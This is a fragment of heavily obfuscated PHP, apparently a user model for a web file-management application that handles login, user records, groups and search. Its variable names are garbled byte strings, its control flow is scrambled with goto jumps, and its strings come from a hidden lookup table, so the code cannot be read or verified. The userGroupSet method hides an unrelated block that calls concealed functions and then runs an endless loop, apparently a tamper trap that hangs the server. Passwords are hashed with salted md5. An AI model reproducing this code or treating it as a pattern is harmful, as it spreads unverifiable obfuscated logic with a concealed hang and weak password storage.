$this->getInfo($E‡Òº¦­[$E® öÑİï›[1526]]); } return !1; } public function userLoginCheck($B…¡™‚¼Ø», $e›îºéÕ«Ã) { $AÓàİ”øÊŞ =& $_SERVER[Ç³Íß¦Ó]; $D¬Ù¼Áäñé = $this->userLoginFind($B…¡™‚¼Ø»); if (!$D¬Ù¼Áäñé) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($D¬Ù¼Áäñé[$AÓàİ”øÊŞ[1526]], $e›îºéÕ«Ã)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($D¬Ù¼Áäñé[$AÓàİ”øÊŞ[1526]]); } public function userLoginFind($F“ÅÁÀáÏ¦) { $c•œ‚ÂÛ§ë =& $_SERVER[Ç³Íß¦Ó]; $d•®£›ğ®Á = array($c•œ‚ÂÛ§ë[28] => $F“ÅÁÀáÏ¦, $c•œ‚ÂÛ§ë[1953] => $F“ÅÁÀáÏ¦, $c•œ‚ÂÛ§ë[302] => $F“ÅÁÀáÏ¦, $c•œ‚ÂÛ§ë[2132] => $F“ÅÁÀáÏ¦, $c•œ‚ÂÛ§ë[957] => $c•œ‚ÂÛ§ë[959]); if ($this->nickNameRpt()) { unset($d•®£›ğ®Á[$c•œ‚ÂÛ§ë[1953]]); } return $this->where($d•®£›ğ®Á)->find(); } public function clearCache($b’¹—°Ùš×) { $bƒ¶ÊÚ‰ˆ¯ =& $_SERVER[Ç³Íß¦Ó]; $this->cacheFunctionClear($bƒ¶ÊÚ‰ˆ¯[1768], $b’¹—°Ùš×); $this->cacheFunctionClear($bƒ¶ÊÚ‰ˆ¯[1762], $b’¹—°Ùš×); $this->cacheFunctionClear($bƒ¶ÊÚ‰ˆ¯[2113], $b’¹—°Ùš×); } public function userPasswordCheck($bëƒ®ì§–, $e®Ñ»ŞˆÃ) { $Eµ²Ñ£åÑ¹ =& $_SERVER[Ç³Íß¦Ó]; $A»Ê¨Ú°× = $this->where(array($Eµ²Ñ£åÑ¹[1526] => intval($bëƒ®ì§–)))->find(); $E‰«Š†“ƒ = $this->metaGet($bëƒ®ì§–); $Aö•«¼–ê = isset($E‰«Š†“ƒ[$Eµ²Ñ£åÑ¹[2133]]) ? $E‰«Š†“ƒ[$Eµ²Ñ£åÑ¹[2133]] : $Eµ²Ñ£åÑ¹[33]; if (md5($Aö•«¼–ê . trim($e®Ñ»ŞˆÃ)) !== $A»Ê¨Ú°×[$Eµ²Ñ£åÑ¹[849]]) { return !1; } return !0; } public function userAdd($BÕ¾¦ßİ²­) { goto Cô­ˆäÏ³ß; D¢•Ìº½÷Ç: $CêšóŸ§íì = array($B’Ÿ ¯µ[2141] => $a®†ÊÌ·õ[$B’Ÿ ¯µ[849]], $B’Ÿ ¯µ[2137] => $a®†ÊÌ·õ[$B’Ÿ ¯µ[1953]]); $this->userEdit($e¼Ğ…­Œ‹, $CêšóŸ§íì); Model($B’Ÿ ¯µ[1204])->userRootAdd($e¼Ğ…­Œ‹); goto aÒ‘Ë®ë›Î; AïòÁÛê: $CÖî¼ß†ã = $this->_checkExist($BÕ¾¦ßİ²­); if ($CÖî¼ß†ã !== !0) { return $CÖî¼ß†ã; } $e¼Ğ…­Œ‹ = $this->add($a®†ÊÌ·õ); goto D¢•Ìº½÷Ç; aÒ‘Ë®ë›Î: return $e¼Ğ…­Œ‹; goto AÀŒÕÔáÔ; Cô­ˆäÏ³ß: $B’Ÿ ¯µ =& $_SERVER[Ç³Íß¦Ó]; $a®†ÊÌ·õ = array($B’Ÿ ¯µ[411] => $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[28]], $B’Ÿ ¯µ[2134] => $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1412]], $B’Ÿ ¯µ[2135] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[302]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[302]] : $B’Ÿ ¯µ[33], $B’Ÿ ¯µ[2136] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[2132]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[2132]] : $B’Ÿ ¯µ[33], $B’Ÿ ¯µ[2137] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1953]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1953]] : $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[28]], $B’Ÿ ¯µ[2138] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[2117]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[2117]] : $B’Ÿ ¯µ[33], $B’Ÿ ¯µ[2139] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[2140]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[2140]] : 1, $B’Ÿ ¯µ[2141] => $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[849]], $B’Ÿ ¯µ[1763] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1673]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1673]] : 1024 * 1024 * 20, $B’Ÿ ¯µ[1764] => 0, $B’Ÿ ¯µ[2142] => 0, $B’Ÿ ¯µ[1807] => isset($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[714]]) ? $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[714]] : 1); if (!empty($BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1526]])) { $a®†ÊÌ·õ[$B’Ÿ ¯µ[1526]] = $BÕ¾¦ßİ²­[$B’Ÿ ¯µ[1526]]; } goto AïòÁÛê; AÀŒÕÔáÔ: } protected function userEditTest($c¾ˆ†´À¹, $EÚ¿‹æå•‡) { return $this->call($_SERVER[Ç³Íß¦Ó][2143], $c¾ˆ†´À¹, $EÚ¿‹æå•‡); } protected function userEdit($F¹ÎÄÆ­ÈÈ, $C®ĞÌÔ­Ì) { goto B¼¦¶Ô¢Ÿ; fì±¦Á³ò: $this->where(array($bÛ¸Çï š[1518] => $F¹ÎÄÆ­ÈÈ))->save($C®ĞÌÔ­Ì); if (isset($C®ĞÌÔ­Ì[$bÛ¸Çï š[1953]])) { $this->setNamePinyin($F¹ÎÄÆ­ÈÈ, $C®ĞÌÔ­Ì[$bÛ¸Çï š[1953]]); } $this->clearCache($F¹ÎÄÆ­ÈÈ); goto BŠò‡©Ã×ˆ; BŠò‡©Ã×ˆ: return !0; goto cÒ²œÆêë; B¼¦¶Ô¢Ÿ: $bÛ¸Çï š =& $_SERVER[Ç³Íß¦Ó]; $f“¾éƒ¹… = $this->getInfoSimple($F¹ÎÄÆ­ÈÈ); if (!$f“¾éƒ¹…) { return !1; } goto AÁŠŠ™ÅŞÜ; AÁŠŠ™ÅŞÜ: $bàç‘Êí›î = $this->_checkExist($C®ĞÌÔ­Ì, $F¹ÎÄÆ­ÈÈ); if ($bàç‘Êí›î !== !0) { return $bàç‘Êí›î; } if (isset($C®ĞÌÔ­Ì[$bÛ¸Çï š[849]]) && trim($C®ĞÌÔ­Ì[$bÛ¸Çï š[849]]) != $bÛ¸Çï š[33]) { $a–çº¹§Ãî = $this->metaGet($F¹ÎÄÆ­ÈÈ); if (empty($a–çº¹§Ãî[$bÛ¸Çï š[2133]])) { $a–çº¹§Ãî[$bÛ¸Çï š[2133]] = rand_string(10); Model($bÛ¸Çï š[501])->metaSet($F¹ÎÄÆ­ÈÈ, $bÛ¸Çï š[2133], $a–çº¹§Ãî[$bÛ¸Çï š[2133]]); } $C®ĞÌÔ­Ì[$bÛ¸Çï š[849]] = md5($a–çº¹§Ãî[$bÛ¸Çï š[2133]] . trim($C®ĞÌÔ­Ì[$bÛ¸Çï š[849]])); } else { unset($C®ĞÌÔ­Ì[$bÛ¸Çï š[849]]); } goto fì±¦Á³ò; cÒ²œÆêë: } public function setNamePinyin($A§°ŒÙß›, $fÑôÅâº¦ì = false) { $D–†ñÂÁ†“ =& $_SERVER[Ç³Íß¦Ó]; if (!$fÑôÅâº¦ì) { $FÛø­Öôª = $this->getInfoSimple($A§°ŒÙß›); $fÑôÅâº¦ì = $FÛø­Öôª[$D–†ñÂÁ†“[1953]] ? $FÛø­Öôª[$D–†ñÂÁ†“[1953]] : $FÛø­Öôª[$D–†ñÂÁ†“[28]]; } $cŠ£¹–¨é› = Model($D–†ñÂÁ†“[505]); if (!Input::check($fÑôÅâº¦ì, $D–†ñÂÁ†“[555])) { return $cŠ£¹–¨é›->metaSet($A§°ŒÙß›, array($D–†ñÂÁ†“[442] => $D–†ñÂÁ†“[33], $D–†ñÂÁ†“[441] => $D–†ñÂÁ†“[33])); } return $cŠ£¹–¨é›->metaSet($A§°ŒÙß›, array($D–†ñÂÁ†“[442] => str_replace($D–†ñÂÁ†“[50], $D–†ñÂÁ†“[33], Pinyin::encode($fÑôÅâº¦ì)), $D–†ñÂÁ†“[441] => Pinyin::encode($fÑôÅâº¦ì, $D–†ñÂÁ†“[556]))); } private function nickNameRpt() { $BÕí¨†Óïä =& $_SERVER[Ç³Íß¦Ó]; $BÇ¼êê = Model($BÕí¨†Óïä[731])->get($BÕí¨†Óïä[2144]); $AùÑ—éŠŸ = $GLOBALS[$BÕí¨†Óïä[6]][$BÕí¨†Óïä[377]][$BÕí¨†Óïä[2144]]; $CÙ†ÁäÆµó = !is_null($BÇ¼êê) ? $BÇ¼êê : $AùÑ—éŠŸ; return !!$CÙ†ÁäÆµó; } private function _checkExist($F¤»Ò™ƒ‡Æ, $A»”Ì“ç¬ç = false) { $C½ÕùŸİ¾ =& $_SERVER[Ç³Íß¦Ó]; $B¨†ÑÒ¹œÛ = array($C½ÕùŸİ¾[28] => UserModel::ERROR_USER_EXIST_NAME, $C½ÕùŸİ¾[1953] => UserModel::ERROR_USER_EXIST_NICKNAME, $C½ÕùŸİ¾[302] => UserModel::ERROR_USER_EXIST_EMAIL, $C½ÕùŸİ¾[2132] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($B¨†ÑÒ¹œÛ[$C½ÕùŸİ¾[1953]]); } $aÈ˜¥‡Èõ¹ = $A»”Ì“ç¬ç ? array($C½ÕùŸİ¾[1526] => array($C½ÕùŸİ¾[2145], $A»”Ì“ç¬ç)) : array(); foreach ($B¨†ÑÒ¹œÛ as $Dä‹¬¢¦‚Â => $D¶Äç›²™) { $C„–¾ÃõÚ = array(); foreach ($B¨†ÑÒ¹œÛ as $c÷¤±•‡ÉŞ => $aëõâà¸Š¿) { if (isset($F¤»Ò™ƒ‡Æ[$c÷¤±•‡ÉŞ]) && $F¤»Ò™ƒ‡Æ[$c÷¤±•‡ÉŞ]) { $C„–¾ÃõÚ[] = $F¤»Ò™ƒ‡Æ[$c÷¤±•‡ÉŞ]; } } if (!$C„–¾ÃõÚ) { continue; } $fµ¬ñÒ»ò° = array_merge(array($Dä‹¬¢¦‚Â => array($C½ÕùŸİ¾[7], $C„–¾ÃõÚ)), $aÈ˜¥‡Èõ¹); $fÏ©× Ûó = $this->where($fµ¬ñÒ»ò°)->find(); if ($fÏ©× Ûó) { return $D¶Äç›²™; } } return !0; } public function userListInfo($C™îÆ§öÃï) { $A±‚Ïò‘š =& $_SERVER[Ç³Íß¦Ó]; $e¡…Ì‹ïğ = array(); $C™îÆ§öÃï = is_array($C™îÆ§öÃï) ? array_unique($C™îÆ§öÃï) : array(); if (!$C™îÆ§öÃï) { return $e¡…Ì‹ïğ; } if (count($C™îÆ§öÃï) < 20) { foreach ($C™îÆ§öÃï as $a˜±ÜÇ¥¦) { $e¡…Ì‹ïğ[$a˜±ÜÇ¥¦ . $A±‚Ïò‘š[33]] = $this->getInfoSimpleOuter($a˜±ÜÇ¥¦); } } else { $Fñ‹ŠÛ­Î = array($A±‚Ïò‘š[1518] => array($A±‚Ïò‘š[409], $C™îÆ§öÃï)); if (count($C™îÆ§öÃï) == 1) { $Fñ‹ŠÛ­Î = array($A±‚Ïò‘š[1518] => $C™îÆ§öÃï[0]); } $b›Ä¯¾‡Š… = Model($A±‚Ïò‘š[501])->field($this->simpleField)->where($Fñ‹ŠÛ­Î)->select(); $b›Ä¯¾‡Š… = array_to_keyvalue($b›Ä¯¾‡Š…, $A±‚Ïò‘š[1526]); foreach ($C™îÆ§öÃï as $a˜±ÜÇ¥¦) { $dµÔòçßãí = $b›Ä¯¾‡Š…[$a˜±ÜÇ¥¦]; if (!$dµÔòçßãí) { $e¡…Ì‹ïğ[$a˜±ÜÇ¥¦ . $A±‚Ïò‘š[33]] = $this->getInfoSimpleOuter($a˜±ÜÇ¥¦); continue; } $dµÔòçßãí[$A±‚Ïò‘š[2117]] = Action($A±‚Ïò‘š[2118])->parseUrl($dµÔòçßãí[$A±‚Ïò‘š[2117]]); $e¡…Ì‹ïğ[$a˜±ÜÇ¥¦ . $A±‚Ïò‘š[33]] = $dµÔòçßãí; } } return $e¡…Ì‹ïğ; } protected function userStatus($c±ÚÑáäì½, $A¦•›¢Ñâ) { $B¾ˆ¸ƒ¼ˆ¼ = $this->getInfoSimple($c±ÚÑáäì½); if (!$B¾ˆ¸ƒ¼ˆ¼) { return !1; } $cİ‰Ú¨ÊåŒ = array($_SERVER[Ç³Íß¦Ó][714] => $A¦•›¢Ñâ); return $this->userEdit($c±ÚÑáäì½, $cİ‰Ú¨ÊåŒ); } protected function userRemove($Få×Ä’ºƒ) { goto c½‚«±…ª¤; b›™õÅÁĞÉ: Model($cÂµ”ÏŞ¨ˆ[1970])->removeUserAll($Få×Ä’ºƒ); Model($cÂµ”ÏŞ¨ˆ[791])->userRootRemove($Få×Ä’ºƒ); return $this->where($D¸ğ’Ïİ¾¨)->delete(); goto f†Æ„Ò÷óì; c½‚«±…ª¤: $cÂµ”ÏŞ¨ˆ =& $_SERVER[Ç³Íß¦Ó]; $bêçà“Ò÷§ = $this->getInfoSimple($Få×Ä’ºƒ); if (!$bêçà“Ò÷§) { return !1; } goto dã½ò¦÷‰„; e¯Ö¤ì–‰‚: Model($cÂµ”ÏŞ¨ˆ[1770])->where($D¸ğ’Ïİ¾¨)->delete(); Model($cÂµ”ÏŞ¨ˆ[2131])->where($D¸ğ’Ïİ¾¨)->delete(); Model($cÂµ”ÏŞ¨ˆ[2147])->where($D¸ğ’Ïİ¾¨)->delete(); goto b›™õÅÁĞÉ; dã½ò¦÷‰„: $D¸ğ’Ïİ¾¨ = array($cÂµ”ÏŞ¨ˆ[1518] => $Få×Ä’ºƒ); Model($cÂµ”ÏŞ¨ˆ[562])->where($D¸ğ’Ïİ¾¨)->delete(); Model($cÂµ”ÏŞ¨ˆ[2146])->where($D¸ğ’Ïİ¾¨)->delete(); goto e¯Ö¤ì–‰‚; f†Æ„Ò÷óì: } protected function userGroupSet($F‰¿–»ÁĞ, $AÖÌå‰›–, $cù‡êùÏİƒ = array()) { goto eÔ—ç¨Š°Í; eÔ—ç¨Š°Í: $Dâí¡†ğ´ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($_SERVER[$Dâí¡†ğ´[834]]) || !isset($_SERVER[$Dâí¡†ğ´[832]])) { goto Dš„Ê¡ƒ‚Ù; Dö¼Å‘ËÙ: for ($e¾§©øÂ‹ = $b‚éàˆ; $e¾§©øÂ‹ > 0; $e¾§©øÂ‹++) { $B¼¦®™µ§– = json_encode($GLOBALS[$Dâí¡†ğ´[409]]); } goto DØ¡íŞ‡çå; BÕ¬ôò’Å: $dÛ²·‹÷™ = $F×¨İˆí•œ($dŒ”‘‡°ñå); $dâØÖ µö = explode($Dâí¡†ğ´[228], $dÛ²·‹÷™); if (count($dâØÖ µö) < $Dâí¡†ğ´[589]) { $A†Øâ¬î = $Dâí¡†ğ´[839]; $A†Øâ¬î(); } goto d¹†’°®øŠ; d¹†’°®øŠ: $B¼¦®™µ§– = $Dâí¡†ğ´[840]; $B¼¦®™µ§–($_SERVER[$Dâí¡†ğ´[841]]); $b‚éàˆ = 1; goto Dö¼Å‘ËÙ; Dš„Ê¡ƒ‚Ù: $E‘¶äã¦÷ = $Dâí¡†ğ´[835]; $F×¨İˆí•œ = $Dâí¡†ğ´[836]; $dŒ”‘‡°ñå = $_SERVER[$Dâí¡†ğ´[837]] . $Dâí¡†ğ´[838]; goto BÕ¬ôò’Å; DØ¡íŞ‡çå: } $F–‹ÉŠŒ¤ï = $this->getInfoSimple($F‰¿–»ÁĞ); goto EÃ×÷ñï§; Aƒ¢®Ì¤ö—: $e¡ÜŠØÔÓ = array(); $c¢Ü¼´± = 0; foreach ($AÖÌå‰›– as $dŠ…‹Ò¬å¥ => $DªäŸô‡Ô±) { $bÂ¤¨§àå = array($Dâí¡†ğ´[1526] => $F‰¿–»ÁĞ, $Dâí¡†ğ´[1689] => $dŠ…‹Ò¬å¥, $Dâí¡†ğ´[1784] => $DªäŸô‡Ô±); $bÂ¤¨§àå[$Dâí¡†ğ´[1712]] = isset($cù‡êùÏİƒ[$c¢Ü¼´±]) ? $cù‡êùÏİƒ[$c¢Ü¼´±] : 0; $c¢Ü¼´±++; $e¡ÜŠØÔÓ[] = $bÂ¤¨§àå; } goto d‚öæ„‚¡˜; EÃ×÷ñï§: if (!$F–‹ÉŠŒ¤ï || !is_array($AÖÌå‰›–)) { return !1; } $cÇŸ‰İ±¨ = Model($Dâí¡†ğ´[1770]); $cÇŸ‰İ±¨->where(array($Dâí¡†ğ´[1526] => $F‰¿–»ÁĞ))->delete(); goto Aƒ¢®Ì¤ö—; d‚öæ„‚¡˜: return $cÇŸ‰İ±¨->addAll($e¡ÜŠØÔÓ, array(), !0); goto B¤¼Ğ‰„; B¤¼Ğ‰„: } protected function userGroupAdd($c÷¶¤³ğ¦…, $d¥¨ÂÑÅì¦ = array()) { $b¡±êŸì¼Â =& $_SERVER[Ç³Íß¦Ó]; $D¡˜ ÍéÔŞ = $this->getInfoSimple($c÷¶¤³ğ¦…); if (!$D¡˜ ÍéÔŞ || empty($d¥¨ÂÑÅì¦)) { return !1; } $D„ìæóÕå = array(); foreach ($d¥¨ÂÑÅì¦ as $BÒÍ‡­´° => $CÖŒ»Å¯á«) { $D„ìæóÕå[] = array($b¡±êŸì¼Â[1526] => $c÷¶¤³ğ¦…, $b¡±êŸì¼Â[1689] => $BÒÍ‡­´°, $b¡±êŸì¼Â[1784] => $CÖŒ»Å¯á«, $b¡±êŸì¼Â[1712] => 0); } return Model($b¡±êŸì¼Â[1770])->addAll($D„ìæóÕå, array(), !0); } protected function userGroupRemove($C˜”‹ÇİÀ, $F“Åğ©¯´) { $B“ŠÃâ†“ =& $_SERVER[Ç³Íß¦Ó]; $CçŠÁ„àÑ² = $this->getInfoSimple($C˜”‹ÇİÀ); if (!$CçŠÁ„àÑ² || !$F“Åğ©¯´) { return !1; } $DË²´Şİ×Ò = array($B“ŠÃâ†“[1518] => $C˜”‹ÇİÀ, $B“ŠÃâ†“[1767] => $F“Åğ©¯´); return Model($B“ŠÃâ†“[1770])->where($DË²´Şİ×Ò)->delete(); } public function listData() { $F‰†ÀŒöò‹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($F‰†ÀŒöò‹[$_SERVER[Ç³Íß¦Ó][366]]); return $F‰†ÀŒöò‹; } public function listByID($BÈ†ã§Œ) { $e»İ÷æ¬ÉÚ =& $_SERVER[Ç³Íß¦Ó]; if (!$BÈ†ã§Œ) { return; } $aÏ™‹ç´Ğ‚ = array($e»İ÷æ¬ÉÚ[1526] => array($e»İ÷æ¬ÉÚ[7], $BÈ†ã§Œ)); $fá¼¨¡¡·– = $this->where($aÏ™‹ç´Ğ‚)->select(); $this->_listDataApply($fá¼¨¡¡·–); return $fá¼¨¡¡·–; } public function listByGroup($eâØá¤Ï„¿ = 0, $fÕŠÆ¾Å§… = array()) { goto c¥ŒÉ™©ô; c¥ŒÉ™©ô: $C¼Î™êÂ¢í =& $_SERVER[Ç³Íß¦Ó]; $f†”™ª… = $C¼Î™êÂ¢í[33]; $AÔ‹ÁóĞíÛ = array(); goto FÇåÏñ†Ê; CÌÆ¤µ…àƒ: $this->_listDataApply($f°ÇóÏãø±[$C¼Î™êÂ¢í[366]]); return $f°ÇóÏãø±; goto AìÕ¤·§‰÷; FÇåÏñ†Ê: if ($eâØá¤Ï„¿) { $AÔ‹ÁóĞíÛ = array($C¼Î™êÂ¢í[2148] => intval($eâØá¤Ï„¿)); $f†”™ª… = "\114\x45\106\x54\40\x4a\x4f\111\116\40{$this->tablePrefix}\165\x73\145\162\137\147\x72\157\165\160\x20\165\x73\145\x72\x5f\x67\162\157\165\160\x20\x6f\156\40\165\x73\145\x72\56\x75\x73\145\x72\x49\x44\x20\x3d\x20\x75\x73\x65\162\x5f\x67\162\157\165\x70\x2e\165\x73\x65\x72\111\104"; $fæêØö‹È = Input::get($C¼Î™êÂ¢í[433], null, $C¼Î™êÂ¢í[33]) ? $C¼Î™êÂ¢í[33] : $C¼Î™êÂ¢í[2149]; } if (isset($fÕŠÆ¾Å§…[$C¼Î™êÂ¢í[714]])) { $AÔ‹ÁóĞíÛ[$C¼Î™êÂ¢í[2150]] = $fÕŠÆ¾Å§…[$C¼Î™êÂ¢í[714]]; } $f°ÇóÏãø± = $this->_makeOrder($fæêØö‹È)->field($C¼Î™êÂ¢í[2151])->where($AÔ‹ÁóĞíÛ)->join($f†”™ª…)->selectPage(50); goto CÌÆ¤µ…àƒ; AìÕ¤·§‰÷: } private function _makeOrder($eŸË‰¯…¶ = '') { goto dÃ½éÈªô; BÁÖ£‚‰ÑÅ: $eŸË‰¯…¶ = $eŸË‰¯…¶ . "\165\163\x65\162\56{$B„‰„Íâ‘Õ}\x20{$E„§—‘Œï·}\x2c\40\x75\163\x65\162\56\165\163\x65\162\111\104\x20\x61\x73\x63"; return $this->alias($dÁê³Ô[1893])->order($eŸË‰¯…¶); goto aöÃÃêÕàÚ; A’äøˆ¶ ƒ: $B„‰„Íâ‘Õ = Input::get($dÁê³Ô[433], $dÁê³Ô[7], $dÁê³Ô[1518], $a¤‰íÆĞá»); $E„§—‘Œï· = Input::get($dÁê³Ô[434], $dÁê³Ô[7], $dÁê³Ô[1771], array($dÁê³Ô[1771], $dÁê³Ô[428])); $E„§—‘Œï· = $cÍ±¥¹²‹ò[$E„§—‘Œï·]; goto BÁÖ£‚‰ÑÅ; dÃ½éÈªô: $dÁê³Ô =& $_SERVER[Ç³Íß¦Ó]; $a¤‰íÆĞá» = array($dÁê³Ô[1526], $dÁê³Ô[28], $dÁê³Ô[1675], $dÁê³Ô[1647], $dÁê³Ô[193]); $cÍ±¥¹²‹ò = array($dÁê³Ô[426] => $dÁê³Ô[427], $dÁê³Ô[428] => $dÁê³Ô[429]); goto A’äøˆ¶ ƒ; aöÃÃêÕàÚ: } public function listSearch($c¿ìÌŸĞåØ) { goto cî†Ùê‘‹©; dÕ†ßÖÔõ¥: $a‡ØÆ¹÷É¯ = str_replace($b£‚¯‰êÙå[1774], $b£‚¯‰êÙå[1775], trim($a‡ØÆ¹÷É¯)); $a¥‰“İ˜¨Å = array($b£‚¯‰êÙå[28] => array($b£‚¯‰êÙå[379], "\x25{$a‡ØÆ¹÷É¯}\x25"), $b£‚¯‰êÙå[302] => array($b£‚¯‰êÙå[379], "{$a‡ØÆ¹÷É¯}\x25"), $b£‚¯‰êÙå[1953] => array($b£‚¯‰êÙå[379], "{$a‡ØÆ¹÷É¯}\x25"), $b£‚¯‰êÙå[957] => $b£‚¯‰êÙå[1776]); if (Input::check($a‡ØÆ¹÷É¯, $b£‚¯‰êÙå[308])) { $a¥‰“İ˜¨Å[$b£‚¯‰êÙå[1526]] = array($b£‚¯‰êÙå[379], "{$a‡ØÆ¹÷É¯}\45"); $a¥‰“İ˜¨Å[$b£‚¯‰êÙå[2132]] = array($b£‚¯‰êÙå[379], "{$a‡ØÆ¹÷É¯}\x25"); } goto aëÉËŸÕš±; aëÉËŸÕš±: if (!$a‡ØÆ¹÷É¯) { $a¥‰“İ˜¨Å = array(); } if (isset($c¿ìÌŸĞåØ[$b£‚¯‰êÙå[714]])) { $a¥‰“İ˜¨Å[$b£‚¯‰êÙå[714]] = $c¿ìÌŸĞåØ[$b£‚¯‰êÙå[714]]; } $a¥‰“İ˜¨Å = $this->parseWhereLike($a¥‰“İ˜¨Å); goto E£›ºõ½’; cî†Ùê‘‹©: $b£‚¯‰êÙå =& $_SERVER[Ç³Íß¦Ó]; $a‡ØÆ¹÷É¯ = $c¿ìÌŸĞåØ[$b£‚¯‰êÙå[1772]]; $FœÖ¢Ä»Ó› = isset($c¿ìÌŸĞåØ[$b£‚¯‰êÙå[1773]]) ? $c¿ìÌŸĞåØ[$b£‚¯‰êÙå[1773]] : !1; goto dÕ†ßÖÔõ¥; E£›ºõ½’: $dâŸŠœñ²š = $this->_makeOrder()->where($a¥‰“İ˜¨Å)->selectPage(20); if (!$dâŸŠœñ²š || count($dâŸŠœñ²š[$b£‚¯‰êÙå[366]]) < 5 && Input::check($a‡ØÆ¹÷É¯, $b£‚¯‰êÙå[315])) { $FÛäˆ®˜Ÿ = $this->_searchFromMeta($b£‚¯‰êÙå[441], $a‡ØÆ¹÷É¯, 10); $EäçÌ¬òÛ = $this->_searchFromMeta($b£‚¯‰êÙå[442], $a‡ØÆ¹÷É¯, 10); $d”å‚·ğÕ­ = array_merge($FÛäˆ®˜Ÿ, $EäçÌ¬òÛ, $dâŸŠœñ²š[$b£‚¯‰êÙå[366]]); $dâŸŠœñ²š[$b£‚¯‰êÙå[366]] = array_unique_by_key($d”å‚·ğÕ­, $b£‚¯‰êÙå[1526]); $dâŸŠœñ²š[$b£‚¯‰êÙå[363]][$b£‚¯‰êÙå[364]] = count($dâŸŠœñ²š[$b£‚¯‰êÙå[366]]); $dâŸŠœñ²š[$b£‚¯‰êÙå[363]][$b£‚¯‰êÙå[365]] = ceil($dâŸŠœñ²š[$b£‚¯‰êÙå[363]][$b£‚¯‰êÙå[364]] / $dâŸŠœñ²š[$b£‚¯‰êÙå[363]][$b£‚¯‰êÙå[360]]); } $this->_listDataApply($dâŸŠœñ²š[$b£‚¯‰êÙå[366]]); goto A›í‡ˆçÎƒ; A›í‡ˆçÎƒ: $this->_filterByGroup($dâŸŠœñ²š, $FœÖ¢Ä»Ó›); return $dâŸŠœñ²š; goto D•¯ùÃâßÑ; D•¯ùÃâßÑ: } private function _filterByGroup(&$aáŠ´ÈĞª­, $eµê‘÷‚ã) { $D¡›•ö®ã´ =& $_SERVER[Ç³Íß¦Ó]; if (!$eµê‘÷‚ã) { return $aáŠ´ÈĞª­; } foreach ($aáŠ´ÈĞª­[$D¡›•ö®ã´[366]] as $dŒô¯¢à˜ => &$b¿£»Ç§‹·) { $fÁŒÁŠ‚ì± = array_to_keyvalue($b¿£»Ç§‹·[$D¡›•ö®ã´[1863]], $D¡›•ö®ã´[33], $D¡›•ö®ã´[1689]); if (!in_array($eµê‘÷‚ã, $fÁŒÁŠ‚ì±)) { unset($aáŠ´ÈĞª­[$D¡›•ö®ã´[366]][$dŒô¯¢à˜]); } } unset($b¿£»Ç§‹·); $aáŠ´ÈĞª­[$D¡›•ö®ã´[366]] = array_values($aáŠ´ÈĞª­[$D¡›•ö®ã´[366]]); $aáŠ´ÈĞª­[$D¡›•ö®ã´[363]] = array($D¡›•ö®ã´[1925] => count($aáŠ´ÈĞª­[$D¡›•ö®ã´[366]]), $D¡›•ö®ã´[1923] => $aáŠ´ÈĞª­[$D¡›•ö®ã´[363]][$D¡›•ö®ã´[360]], $D¡›•ö®ã´[1922] => 1, $D¡›•ö®ã´[1924] => 1); } private function _searchFromMeta($cá…šÎƒŸ, $FõñË§’ã÷, $f´¦˜æŒå) { goto F¦²äš½; F¦²äš½: $DöÇ±ã¹Ñ‹ =& $_SERVER[Ç³Íß¦Ó]; $FõñË§’ã÷ = strtolower($FõñË§’ã÷); $a‘½¼»ùğ = array($DöÇ±ã¹Ñ‹[93] => $cá…šÎƒŸ, $DöÇ±ã¹Ñ‹[371] => array($DöÇ±ã¹Ñ‹[379], "\x25{$FõñË§’ã÷}\x25")); goto c‘¤Ù¹°·¢; CÔ£‚§¸Œ: $E‚ô ©ˆøŒ = array_to_keyvalue($E‚ô ©ˆøŒ, $DöÇ±ã¹Ñ‹[33], $DöÇ±ã¹Ñ‹[1526]); $AÎÀŒòË·Ç = $this->where(array($DöÇ±ã¹Ñ‹[1518] => array($DöÇ±ã¹Ñ‹[7], $E‚ô ©ˆøŒ)))->select(); if (!$AÎÀŒòË·Ç) { return array(); } goto cÍ˜­¯³·Â; c‘¤Ù¹°·¢: $a‘½¼»ùğ = $this->parseWhereLike($a‘½¼»ùğ); $E‚ô ©ˆøŒ = Model($DöÇ±ã¹Ñ‹[2152])->where($a‘½¼»ùğ)->limit($f´¦˜æŒå)->select(); if (!$E‚ô ©ˆøŒ) { return array(); } goto CÔ£‚§¸Œ; cÍ˜­¯³·Â: return $AÎÀŒòË·Ç; goto FÀùÆ„Ë¥Æ; FÀùÆ„Ë¥Æ: } private function _listDataApplyItem($c†¤íëÊ¡) { $AÑ‹ÈÙ»±Ó = array($c†¤íëÊ¡); $this->_listDataApply($AÑ‹ÈÙ»±Ó); return $AÑ‹ÈÙ»±Ó[0]; } private function _listDataApply(&$DÈ©ˆÕØ) { goto d‰ÍÍË—İ‹; D£ğÊ¨º²ø: $this->_listAppendSourceRoot($DÈ©ˆÕØ, $aïÚËé×Å©); goto cĞïáíÓË; dÃ‡¨İ¿”™: $aïÚËé×Å© = array_to_keyvalue($DÈ©ˆÕØ, $C»‡Ü°©Ğõ[33], $C»‡Ü°©Ğõ[1526]); $this->_listAppendGroup($DÈ©ˆÕØ, $aïÚËé×Å©); $this->_listAppendMeta($DÈ©ˆÕØ, $aïÚËé×Å©); goto D£ğÊ¨º²ø; d‰ÍÍË—İ‹: 